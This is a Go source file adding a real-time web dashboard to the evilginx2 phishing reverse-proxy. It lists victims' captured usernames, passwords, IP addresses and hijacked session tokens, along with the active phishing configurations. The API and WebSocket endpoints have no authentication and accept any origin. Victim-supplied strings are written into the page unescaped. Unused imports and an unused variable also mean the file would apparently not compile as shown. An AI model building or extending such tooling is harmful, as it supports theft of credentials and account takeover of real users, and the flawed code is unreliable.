package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebServer struct {
	server      *http.Server
	cfg         *Config
	db          *database.Database
	proxy       *HttpProxy
	upgrader    websocket.Upgrader
	clients     map[*websocket.Conn]bool
	clientsMutex sync.RWMutex
	isRunning   bool
}

type DashboardData struct {
	Sessions      []*database.Session `json:"sessions"`
	ActiveSessions int                `json:"active_sessions"`
	TotalSessions  int                `json:"total_sessions"`
	ServerStats   *ServerStats       `json:"server_stats"`
	Phishlets     []PhishletInfo     `json:"phishlets"`
}

type ServerStats struct {
	Uptime       string `json:"uptime"`
	Domain       string `json:"domain"`
	IPAddress    string `json:"ip_address"`
	HTTPSPort    int    `json:"https_port"`
	DNSPort      int    `json:"dns_port"`
	TelegramEnabled bool `json:"telegram_enabled"`
}

type PhishletInfo struct {
	Name     string `json:"name"`
	Enabled  bool   `json:"enabled"`
	Hostname string `json:"hostname"`
	Visible  bool   `json:"visible"`
}

type WebSocketMessage struct {
	Type    string      `json:"type"`
	Data    interface{} `json:"data"`
	Time    time.Time   `json:"time"`
}

var startTime = time.Now()

func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServer {
	ws := &WebServer{
		cfg:      cfg,
		db:       db,
		proxy:    proxy,
		clients:  make(map[*websocket.Conn]bool),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true // Allow all origins for development
			},
		},
	}

	router := mux.NewRouter()
	
	// Dashboard routes
	router.HandleFunc("/", ws.handleDashboard).Methods("GET")
	router.HandleFunc("/dashboard", ws.handleDashboard).Methods("GET")
	
	// API routes
	router.HandleFunc("/api/sessions", ws.handleAPISessions).Methods("GET")
	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
	
	// WebSocket endpoint
	router.HandleFunc("/ws", ws.handleWebSocket).Methods("GET")
	
	// Static file serving
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))

	ws.server = &http.Server{
		Addr:         fmt.Sprintf(":%d", cfg.GetWebPort()),
		Handler:      router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	return ws
}

func (ws *WebServer) Start() error {
	if ws.isRunning {
		return fmt.Errorf("web server is already running")
	}

	go func() {
		log.Info("starting web dashboard on port %d", ws.cfg.GetWebPort())
		if err := ws.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("web server error: %v", err)
		}
	}()

	ws.isRunning = true
	return nil
}

func (ws *WebServer) Stop() error {
	if !ws.isRunning {
		return nil
	}

	ws.isRunning = false
	return ws.server.Close()
}

func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	dashboardHTML := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evilginx Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }

        .header p {
            color: #888;
            font-size: 1.1rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .stat-label {
            color: #888;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .sessions-section {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 1.8rem;
            margin-bottom: 20px;
            color: #4ecdc4;
        }

        .sessions-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .sessions-table th,
        .sessions-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .sessions-table th {
            background: rgba(255, 255, 255, 0.1);
            color: #4ecdc4;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .sessions-table tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-captured {
            background: #4ecdc4;
            color: #0c0c0c;
        }

        .status-empty {
            background: #666;
            color: #fff;
        }

        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 0.9rem;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .connection-status.connected {
            background: #4ecdc4;
            color: #0c0c0c;
        }

        .connection-status.disconnected {
            background: #ff6b6b;
            color: #fff;
        }

        .loading {
            text-align: center;
            padding: 50px;
            color: #888;
        }

        .phishlets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .phishlet-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .phishlet-card:hover {
            border-color: rgba(255, 255, 255, 0.2);
        }

        .phishlet-name {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 10px;
            color: #4ecdc4;
        }

        .phishlet-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .auto-refresh {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 25px;
            padding: 10px 20px;
            color: #4ecdc4;
            font-size: 0.9rem;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .pulsing {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎣 Evilginx Dashboard</h1>
            <p>Real-time monitoring and session management</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-sessions">0</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="active-sessions">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="captured-sessions">0</div>
                <div class="stat-label">Captured Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uptime">0h 0m</div>
                <div class="stat-label">Uptime</div>
            </div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">📊 Recent Sessions</h2>
            <div id="sessions-content" class="loading">Loading sessions...</div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">🎯 Phishlets</h2>
            <div id="phishlets-content" class="loading">Loading phishlets...</div>
        </div>
    </div>

    <div class="connection-status disconnected" id="connection-status">
        Disconnected
    </div>

    <div class="auto-refresh">
        🔄 Auto-refresh enabled
    </div>

    <script>
        class EvilginxDashboard {
            constructor() {
                this.ws = null;
                this.reconnectInterval = null;
                this.init();
            }

            init() {
                this.connectWebSocket();
                this.loadInitialData();
                
                // Auto-refresh every 5 seconds if WebSocket is not connected
                setInterval(() => {
                    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
                        this.loadInitialData();
                    }
                }, 5000);
            }

            connectWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = ` + "`" + `${protocol}//${window.location.host}/ws` + "`" + `;
                
                this.ws = new WebSocket(wsUrl);
                
                this.ws.onopen = () => {
                    console.log('WebSocket connected');
                    this.updateConnectionStatus(true);
                    if (this.reconnectInterval) {
                        clearInterval(this.reconnectInterval);
                        this.reconnectInterval = null;
                    }
                };

                this.ws.onmessage = (event) => {
                    const message = JSON.parse(event.data);
                    this.handleWebSocketMessage(message);
                };

                this.ws.onclose = () => {
                    console.log('WebSocket disconnected');
                    this.updateConnectionStatus(false);
                    this.scheduleReconnect();
                };

                this.ws.onerror = (error) => {
                    console.error('WebSocket error:', error);
                    this.updateConnectionStatus(false);
                };
            }

            scheduleReconnect() {
                if (this.reconnectInterval) return;
                
                this.reconnectInterval = setInterval(() => {
                    console.log('Attempting to reconnect...');
                    this.connectWebSocket();
                }, 3000);
            }

            handleWebSocketMessage(message) {
                switch (message.type) {
                    case 'session_update':
                        this.updateSessionsTable(message.data);
                        break;
                    case 'stats_update':
                        this.updateStats(message.data);
                        break;
                    case 'new_session':
                        this.addNewSession(message.data);
                        break;
                }
            }

            updateConnectionStatus(connected) {
                const statusEl = document.getElementById('connection-status');
                if (connected) {
                    statusEl.className = 'connection-status connected';
                    statusEl.textContent = 'Connected';
                } else {
                    statusEl.className = 'connection-status disconnected';
                    statusEl.textContent = 'Disconnected';
                }
            }

            async loadInitialData() {
                try {
                    const [sessionsData, statsData, phishletsData] = await Promise.all([
                        fetch('/api/sessions').then(r => r.json()),
                        fetch('/api/stats').then(r => r.json()),
                        fetch('/api/phishlets').then(r => r.json())
                    ]);

                    this.updateSessionsTable(sessionsData);
                    this.updateStats(statsData);
                    this.updatePhishlets(phishletsData);
                } catch (error) {
                    console.error('Error loading initial data:', error);
                }
            }

            updateStats(stats) {
                document.getElementById('total-sessions').textContent = stats.total_sessions || 0;
                document.getElementById('active-sessions').textContent = stats.active_sessions || 0;
                document.getElementById('captured-sessions').textContent = stats.captured_sessions || 0;
                document.getElementById('uptime').textContent = stats.uptime || '0h 0m';
            }

            updateSessionsTable(sessions) {
                const contentEl = document.getElementById('sessions-content');
                
                if (!sessions || sessions.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No sessions found</p>';
                    return;
                }

                const tableHTML = ` + "`" + `
                    <table class="sessions-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Phishlet</th>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Status</th>
                                <th>IP Address</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${sessions.map(session => ` + "`" + `
                                <tr>
                                    <td>${session.id}</td>
                                    <td><strong>${session.phishlet}</strong></td>
                                    <td>${session.username || '-'}</td>
                                    <td>${session.password ? '••••••••' : '-'}</td>
                                    <td>
                                        <span class="status-badge ${this.getSessionStatus(session)}">
                                            ${this.getSessionStatusText(session)}
                                        </span>
                                    </td>
                                    <td>${session.remote_addr}</td>
                                    <td>${new Date(session.update_time * 1000).toLocaleString()}</td>
                                </tr>
                            ` + "`" + `).join('')}
                        </tbody>
                    </table>
                ` + "`" + `;

                contentEl.innerHTML = tableHTML;
            }

            updatePhishlets(phishlets) {
                const contentEl = document.getElementById('phishlets-content');
                
                if (!phishlets || phishlets.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No phishlets found</p>';
                    return;
                }

                const phishletsHTML = ` + "`" + `
                    <div class="phishlets-grid">
                        ${phishlets.map(phishlet => ` + "`" + `
                            <div class="phishlet-card">
                                <div class="phishlet-name">${phishlet.name}</div>
                                <div class="phishlet-status">
                                    <span>Status:</span>
                                    <span class="status-badge ${phishlet.enabled ? 'status-captured' : 'status-empty'}">
                                        ${phishlet.enabled ? 'Enabled' : 'Disabled'}
                                    </span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Hostname:</span>
                                    <span>${phishlet.hostname || 'Not set'}</span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Visible:</span>
                                    <span>${phishlet.visible ? 'Yes' : 'No'}</span>
                                </div>
                            </div>
                        ` + "`" + `).join('')}
                    </div>
                ` + "`" + `;

                contentEl.innerHTML = phishletsHTML;
            }

            getSessionStatus(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
                    return 'status-captured';
                }
                return 'status-empty';
            }

            getSessionStatusText(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
                    return 'Captured';
                }
                return 'Empty';
            }

            addNewSession(session) {
                // Add visual notification for new session
                const statusEl = document.getElementById('connection-status');
                statusEl.classList.add('pulsing');
                setTimeout(() => statusEl.classList.remove('pulsing'), 2000);
                
                // Refresh the sessions table
                this.loadInitialData();
            }
        }

        // Initialize the dashboard
        document.addEventListener('DOMContentLoaded', () => {
            new EvilginxDashboard();
        });
    </script>
</body>
</html>
	`
	
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(dashboardHTML))
}

func (ws *WebServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := ws.db.ListSessions()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (ws *WebServer) handleAPISessionDetails(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	session, err := ws.db.GetSessionById(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(session)
}

func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		// Consider sessions from last 24 hours as active
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	stats := map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
		"domain":           ws.cfg.GetBaseDomain(),
		"ip_address":       ws.cfg.GetServerExternalIP(),
		"https_port":       ws.cfg.GetHttpsPort(),
		"dns_port":         ws.cfg.GetDnsPort(),
		"telegram_enabled": ws.cfg.GetTelegramEnabled(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(stats)
}

func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) {
	var phishlets []PhishletInfo
	
	for _, name := range ws.cfg.GetPhishletNames() {
		phishlet, err := ws.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		
		config := ws.cfg.PhishletConfig(name)
		phishlets = append(phishlets, PhishletInfo{
			Name:     name,
			Enabled:  config.Enabled,
			Hostname: config.Hostname,
			Visible:  config.Visible,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(phishlets)
}

func (ws *WebServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := ws.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("websocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	ws.clientsMutex.Lock()
	ws.clients[conn] = true
	ws.clientsMutex.Unlock()

	log.Info("websocket client connected")

	// Send initial data
	ws.sendToClient(conn, "stats_update", ws.getStatsData())
	sessions, _ := ws.db.ListSessions()
	ws.sendToClient(conn, "session_update", sessions)

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Debug("websocket client disconnected: %v", err)
			break
		}
	}

	ws.clientsMutex.Lock()
	delete(ws.clients, conn)
	ws.clientsMutex.Unlock()
}

func (ws *WebServer) sendToClient(conn *websocket.Conn, msgType string, data interface{}) {
	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	err := conn.WriteJSON(message)
	if err != nil {
		log.Error("websocket write error: %v", err)
	}
}

func (ws *WebServer) BroadcastToClients(msgType string, data interface{}) {
	ws.clientsMutex.RLock()
	defer ws.clientsMutex.RUnlock()

	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	for conn := range ws.clients {
		err := conn.WriteJSON(message)
		if err != nil {
			log.Error("websocket broadcast error: %v", err)
			conn.Close()
			delete(ws.clients, conn)
		}
	}
}

func (ws *WebServer) getStatsData() map[string]interface{} {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	return map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
	}
}

func (ws *WebServer) NotifyNewSession(session *database.Session) {
	ws.BroadcastToClients("new_session", session)
}

func (ws *WebServer) NotifySessionUpdate(session *database.Session) {
	ws.BroadcastToClients("session_update", session)
} 